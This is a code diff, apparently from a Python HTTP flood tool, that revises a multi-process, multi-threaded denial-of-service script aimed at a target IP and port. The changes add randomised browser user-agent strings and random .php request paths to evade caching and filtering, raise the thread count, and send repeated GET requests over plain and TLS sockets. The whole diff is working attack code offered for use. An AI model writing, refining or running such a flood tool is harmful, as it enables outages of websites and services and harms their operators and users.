@@ -6,12 +6,21 @@ import multiprocessing
 import requests
 import sys
 import time
+import datetime
+
+Choice = random.choice
+Intn = random.randint
 
 ip = ""
 port = 80
 period = 10
-path = ""
 num_sent = 0
+rpath = False
+a_z = [
+    "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
+]
+
+path = "/"+Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + ".php"
 for n,args in enumerate(sys.argv):
     if args=="-i":
         ip = str(sys.argv[n+1])
@@ -19,24 +28,9 @@ for n,args in enumerate(sys.argv):
         port = int(sys.argv[n+1])
     if args=="-path":
         path = str(sys.argv[n+1])
+    if args=="-rpath":
+        rpath = True
 
-Choice = random.choice
-useragents = [
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",
-"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
-]
 acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
 		"Accept-Encoding: gzip, deflate\r\n",
@@ -54,99 +48,86 @@ acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
-referers = [
-	"https://www.google.com/search?q=",
-	"https://check-host.net/",
-	"https://www.facebook.com/",
-	"https://www.youtube.com/",
-	"https://www.fbi.com/",
-	"https://www.bing.com/search?q=",
-	"https://r.search.yahoo.com/",
-	"https://www.cia.gov/index.html",
-	"https://vk.com/profile.php?redirect=",
-	"https://www.usatoday.com/search/results?q=",
-	"https://help.baidu.com/searchResult?keywords=",
-	"https://steamcommunity.com/market/search?q=",
-	"https://www.ted.com/search?q=",
-	"https://play.google.com/store/search?q=",
-	"https://www.qwant.com/search?q=",
-	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-	"https://www.google.ad/search?q=",
-	"https://www.google.ae/search?q=",
-	"https://www.google.com.af/search?q=",
-	"https://www.google.com.ag/search?q=",
-	"https://www.google.com.ai/search?q=",
-	"https://www.google.al/search?q=",
-	"https://www.google.am/search?q=",
-	"https://www.google.co.ao/search?q=",
-]
-
-wordlist = [
-    "detonator",
-    "concept",
-    "enjoy",
-    "equation",
-    "afterwards",
-    "flavoring",
-    "hoaxer",
-    "disbeliever",
-    "wreck",
-    "abuse",
-    "belly",
-    "halfway",
-    "grieving",
-    "fortress",
-    "hobby",
-    "consumer",
-    "courageous",
-    "amnesia",
-    "weapon",
-    "chicken",
-]
+def getuseragent():
+	platform = Choice(['Macintosh', 'Windows', 'X11'])
+	if platform == 'Macintosh':
+		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
+	elif platform == 'Windows':
+		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
+	elif platform == 'X11':
+		os  = Choice(['Linux i686', 'Linux x86_64'])
+	browser = Choice(['chrome', 'firefox', 'ie'])
+	if browser == 'chrome':
+		webkit = str(Intn(500, 599))
+		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
+		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
+	elif browser == 'firefox':
+		currentYear = datetime.date.today().year
+		year = str(Intn(2020, currentYear))
+		month = Intn(1, 12)
+		if month < 10:
+			month = '0' + str(month)
+		else:
+			month = str(month)
+		day = Intn(1, 30)
+		if day < 10:
+			day = '0' + str(day)
+		else:
+			day = str(day)
+		gecko = year + month + day
+		version = str(Intn(1, 72)) + '.0'
+		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
+	elif browser == 'ie':
+		version = str(Intn(1, 99)) + '.0'
+		engine = str(Intn(1, 99)) + '.0'
+		option = Choice([True, False])
+		if option == True:
+			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
+		else:
+			token = ''
+		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def rqheader():
     connection = "Connection: keep-alive\r\n"
     accept = Choice(acceptall)
-    referer = "Referer: "+Choice(referers) + ip + "\r\n"
-    useragent = "User-Agent: " + Choice(useragents) + "\r\n"
-    content = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length = "Content-Length: 0 \r\n"
-    header =  connection + useragent + accept + referer + content + length + "\r\n"
+    referer = "Referer: "+ "https://" + ip + "\r\n"
+    useragent = "User-Agent: " + getuseragent() + "\r\n"
+    header =  connection + useragent + accept + referer + "\r\n"
     return header
 
+def port443(x,request):
+    try:
+        for i in range(100):
+            x.send(str.encode(request))
+    except:
+        x.close()
+        try:
+            for i in range(100):
+                 x.send(str.encode(request))
+        except:
+            x.close()
+
 def attack():
+    global path
     global num_sent
     header = rqheader()
     go.wait()
     while True:
-        get_host = "GET " + path + "/?=" + str(random.randint(0,200)) + " HTTP/1.1\r\nHost: " + Choice(wordlist) + str(random.randint(0,200)) + ".com" +":"+str(port)+ "\r\n"
+        if rpath == True:
+            path = "/"+Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + ".php"
+        get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
         num_sent = num_sent + 1
-        print("[+] Sent ", num_sent, " => ", ip , ":", port)
+        print("[+] Sent ", path, num_sent, " => ", ip , ":", port)
         if port == 443:
-            context = ssl.create_default_context()
-            x = context.wrap_socket(s,server_hostname=ip)
-            try:
-                for i in range (100):
-                    x.send(str.encode(request))
-            except:
-                x.close()
+            x = ssl.wrap_socket(s)
+            port443(x,request)
 
-        try:
-            for e in range(100):
-                s.send(str.encode(request))
-        except:
-            s.close()
-            try:
-                for e in range(100):
-                    s.send(str.encode(request))
-            except:
-                s.close()
 
 def build_thread():
-	for _ in range(100):
+	for _ in range(300):
 		bth = threading.Thread(target=attack)
 		bth.start()
 
@@ -158,5 +139,5 @@ def build_process(process_num):
 		th.start()
 
 go = threading.Event()
-build_process(100)
+build_process(15)
 time.sleep(period)
